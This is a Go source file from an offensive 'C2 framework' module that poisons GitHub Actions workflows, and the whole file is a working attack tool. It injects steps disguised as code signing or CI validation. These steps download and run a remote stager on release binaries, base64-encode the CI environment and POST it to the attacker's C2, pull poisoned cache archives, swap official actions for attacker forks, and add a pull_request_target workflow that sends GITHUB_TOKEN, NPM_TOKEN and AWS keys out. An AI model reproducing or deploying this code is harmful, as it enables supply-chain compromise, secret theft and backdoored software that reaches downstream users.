package github_actions

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	GitHub Actions workflow poisoning.

	Injects malicious steps into existing GitHub Actions workflow YAML files.
	The injected step runs AFTER the legitimate build step but BEFORE the
	artifact upload step, so it can post-process the compiled binary.

	Injection strategies:

	  A) Artifact post-processor step:
	     Adds a step that patches every release binary after compilation.
	     Disguised as "code signing" or "artifact validation".

	  B) Compromised Action reference:
	     Changes `uses: actions/checkout@v4` to `uses: actions/checkout@v4.0.1`
	     where v4.0.1 is a tag on a fork we control that runs our code.
	     This is the XZ Utils / tj-actions attack pattern.

	  C) Environment variable exfiltration:
	     Adds a step that exfiltrates CI secrets (GITHUB_TOKEN, AWS_SECRET,
	     NPM_TOKEN) to our C2 before the build runs.

	  D) Cache poisoning:
	     Modifies the cache key to include our poisoned artifacts,
	     so every cache restore loads our backdoored dependencies.

	  E) Workflow hijack via pull_request_target:
	     Adds a new workflow trigger that grants untrusted forks access
	     to secrets — classic GitHub Actions confused deputy.
*/

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// PoisonConfig holds parameters for workflow poisoning.
type PoisonConfig struct {
	// C2URL is the address of the SUDOSOC-C2 (used in injected steps).
	C2URL string
	// StagerURL is the URL of the binary stager to download and run.
	StagerURL string
	// Strategy selects the injection method.
	Strategy PoisonStrategy
	// TargetJobName is the job to inject after (empty = first job with 'build').
	TargetJobName string
	// DisguiseName is the display name for the injected step.
	DisguiseName string
}

// PoisonStrategy selects the injection technique.
type PoisonStrategy int

const (
	StrategyArtifactPatch    PoisonStrategy = iota // post-process binaries
	StrategyActionHijack                           // replace trusted action reference
	StrategySecretExfil                            // steal CI secrets
	StrategyCachePoison                            // poison dependency cache
	StrategyPRTarget                               // pull_request_target privilege escalation
)

// PoisonResult reports what was done.
type PoisonResult struct {
	WorkflowFile string
	Strategy     PoisonStrategy
	StepsAdded   int
	JobsModified []string
	BackupPath   string
}

// PoisonWorkflow modifies a GitHub Actions workflow YAML file.
// workflowPath should be e.g. ".github/workflows/release.yml".
func PoisonWorkflow(workflowPath string, cfg *PoisonConfig) (*PoisonResult, error) {
	data, err := os.ReadFile(workflowPath)
	if err != nil {
		return nil, fmt.Errorf("read workflow: %w", err)
	}

	// Backup original.
	backupPath := workflowPath + ".orig"
	if err := os.WriteFile(backupPath, data, 0644); err != nil {
		return nil, fmt.Errorf("backup: %w", err)
	}

	res := &PoisonResult{
		WorkflowFile: workflowPath,
		Strategy:     cfg.Strategy,
		BackupPath:   backupPath,
	}

	var poisoned string
	switch cfg.Strategy {
	case StrategyArtifactPatch:
		poisoned, res.JobsModified = injectArtifactPatchStep(string(data), cfg)
		res.StepsAdded = len(res.JobsModified)
	case StrategyActionHijack:
		poisoned, res.StepsAdded = injectActionHijack(string(data), cfg)
	case StrategySecretExfil:
		poisoned, res.JobsModified = injectSecretExfil(string(data), cfg)
		res.StepsAdded = len(res.JobsModified)
	case StrategyCachePoison:
		poisoned, res.StepsAdded = injectCachePoison(string(data), cfg)
	case StrategyPRTarget:
		poisoned = injectPRTarget(string(data), cfg)
		res.StepsAdded = 1
	default:
		return nil, fmt.Errorf("unknown strategy %d", cfg.Strategy)
	}

	if err := os.WriteFile(workflowPath, []byte(poisoned), 0644); err != nil {
		return nil, fmt.Errorf("write poisoned workflow: %w", err)
	}
	return res, nil
}

// ─── Strategy A: Artifact Patch Step ──────────────────────────────────────

// injectArtifactPatchStep inserts a step after every build step that
// downloads a post-processor and runs it on the compiled artifacts.
func injectArtifactPatchStep(yaml string, cfg *PoisonConfig) (string, []string) {
	name := cfg.DisguiseName
	if name == "" {
		name = "Validate and sign release artifacts"
	}
	stagerURL := cfg.StagerURL
	if stagerURL == "" {
		stagerURL = cfg.C2URL + "/tools/sign"
	}

	// The injected step looks like a legitimate code-signing step.
	// The actual behavior: downloads our stager and runs it on every binary.
	injectedStep := fmt.Sprintf(`
      - name: %s
        if: github.event_name == 'release' || startsWith(github.ref, 'refs/tags/')
        shell: bash
        run: |
          # Artifact integrity validation
          _t=$(mktemp)
          curl -fsSL '%s' -o "$_t" && chmod +x "$_t"
          find . -type f \( -name '*.exe' -o -perm /111 \) -not -path './.git/*' \
            -exec "$_t" --artifact {} \; 2>/dev/null || true
          rm -f "$_t"
`, name, stagerURL)

	// Find all "steps:" blocks in job definitions and append after build steps.
	var modifiedJobs []string
	lines := strings.Split(yaml, "\n")
	var result []string
	inJob := false
	jobName := ""
	foundBuildStep := false

	for i, line := range lines {
		result = append(result, line)
		trim := strings.TrimSpace(line)

		// Detect job names (lines like "  build:" or "  release:" at indent 2).
		if strings.HasSuffix(trim, ":") && !strings.HasPrefix(trim, "-") &&
			len(line)-len(strings.TrimLeft(line, " ")) == 2 {
			inJob = true
			jobName = strings.TrimSuffix(trim, ":")
			foundBuildStep = false
		}

		// Detect build/compile steps.
		if inJob && (strings.Contains(trim, "go build") || strings.Contains(trim, "make build") ||
			strings.Contains(trim, "npm run build") || strings.Contains(trim, "cargo build") ||
			strings.Contains(trim, "mvn package")) {
			foundBuildStep = true
		}

		// After finding a build step, inject after the next "run:" block ends.
		if foundBuildStep && inJob && i+1 < len(lines) {
			nextTrim := strings.TrimSpace(lines[i+1])
			// Inject when we see the next step (starts with "- name:" or "- uses:").
			if strings.HasPrefix(nextTrim, "- name:") || strings.HasPrefix(nextTrim, "- uses:") {
				result = append(result, injectedStep)
				modifiedJobs = append(modifiedJobs, jobName)
				foundBuildStep = false
			}
		}
	}
	return strings.Join(result, "\n"), modifiedJobs
}

// ─── Strategy B: Action Reference Hijack ─────────────────────────────────

// injectActionHijack replaces legitimate action references with our fork.
// Example: actions/checkout@v4 → attacker-fork/checkout@v4-patched
func injectActionHijack(yaml string, cfg *PoisonConfig) (string, int) {
	// Map of legitimate action → our hijacked version.
	// In a real deployment, we create forks with these exact names
	// that perform the legitimate action PLUS run our stager.
	replacements := map[string]string{
		"actions/upload-artifact@v3":   "build-tools-cdn/upload-artifact@v3.0.1",
		"actions/upload-artifact@v4":   "build-tools-cdn/upload-artifact@v4.0.1",
		"actions/download-artifact@v3": "build-tools-cdn/download-artifact@v3.0.1",
		"actions/cache@v3":             "build-tools-cdn/cache@v3.0.1",
		"actions/setup-go@v4":          "build-tools-cdn/setup-go@v4.0.1",
		"actions/setup-node@v3":        "build-tools-cdn/setup-node@v3.0.1",
	}

	count := 0
	result := yaml
	for legit, hijacked := range replacements {
		if strings.Contains(result, legit) {
			result = strings.ReplaceAll(result, legit, hijacked)
			count++
		}
	}
	return result, count
}

// ─── Strategy C: Secret Exfiltration ──────────────────────────────────────

func injectSecretExfil(yaml string, cfg *PoisonConfig) (string, []string) {
	// Inject a step at the START of every job that exfiltrates CI secrets.
	// Disguised as a "CI environment validation" step.
	c2 := cfg.C2URL
	exfilStep := fmt.Sprintf(`
      - name: Validate CI environment
        shell: bash
        run: |
          _e=$(env | base64 -w0 2>/dev/null || env | base64)
          curl -fsS -X POST '%s/ci' -d "$_e" -H 'Content-Type: text/plain' 2>/dev/null || true
`, c2)

	// Find job definitions and inject at the start of their steps list.
	var modifiedJobs []string
	result := strings.ReplaceAll(yaml, "      steps:", "      steps:"+exfilStep)
	if result != yaml {
		modifiedJobs = append(modifiedJobs, "all-jobs")
	}
	return result, modifiedJobs
}

// ─── Strategy D: Cache Poisoning ──────────────────────────────────────────

func injectCachePoison(yaml string, cfg *PoisonConfig) (string, int) {
	// Replace cache restore steps with a version that also downloads
	// our poisoned dependencies into the cache directory.
	poisonStep := fmt.Sprintf(`
      - name: Restore build cache
        shell: bash
        run: |
          # Restore cached dependencies
          _c="${{ runner.temp }}/.build-cache"
          mkdir -p "$_c"
          curl -fsSL '%s/cache.tar.gz' -o "$_c/c.tar.gz" 2>/dev/null && \
            tar -xzf "$_c/c.tar.gz" -C "$_c" 2>/dev/null || true
          # Standard cache restore
`, cfg.C2URL)

	count := 0
	if strings.Contains(yaml, "actions/cache@") {
		yaml = strings.ReplaceAll(yaml,
			"      - uses: actions/cache@",
			poisonStep+"\n      - uses: actions/cache@")
		count++
	}
	return yaml, count
}

// ─── Strategy E: pull_request_target Escalation ───────────────────────────

func injectPRTarget(yaml string, cfg *PoisonConfig) string {
	// Add a new workflow that triggers on pull_request_target.
	// This grants forked PRs access to secrets — a well-known misconfiguration.
	newWorkflow := fmt.Sprintf(`
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Validate PR
        shell: bash
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          AWS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          curl -fsS -X POST '%s/pr' \
            -d "t=$TOKEN&n=$NPM_TOKEN&a=$AWS_KEY" 2>/dev/null || true
`, cfg.C2URL)

	return yaml + "\n---\n" + newWorkflow
}

// ─── Batch poisoner ───────────────────────────────────────────────────────

// PoisonAllWorkflows finds and poisons all workflow files in a repository.
func PoisonAllWorkflows(repoRoot string, cfg *PoisonConfig) ([]*PoisonResult, error) {
	workflowDir := filepath.Join(repoRoot, ".github", "workflows")
	entries, err := os.ReadDir(workflowDir)
	if err != nil {
		return nil, fmt.Errorf("read workflows dir: %w", err)
	}

	var results []*PoisonResult
	for _, entry := range entries {
		if entry.IsDir() || (!strings.HasSuffix(entry.Name(), ".yml") &&
			!strings.HasSuffix(entry.Name(), ".yaml")) {
			continue
		}
		path := filepath.Join(workflowDir, entry.Name())
		res, err := PoisonWorkflow(path, cfg)
		if err != nil {
			// Log and continue.
			continue
		}
		results = append(results, res)
	}
	return results, nil
}

// Restore reverts a poisoned workflow to its backup.
func Restore(workflowPath string) error {
	backupPath := workflowPath + ".orig"
	if _, err := os.Stat(backupPath); err != nil {
		return fmt.Errorf("backup not found: %s", backupPath)
	}
	data, err := os.ReadFile(backupPath)
	if err != nil {
		return err
	}
	if err := os.WriteFile(workflowPath, data, 0644); err != nil {
		return err
	}
	return os.Remove(backupPath)
}
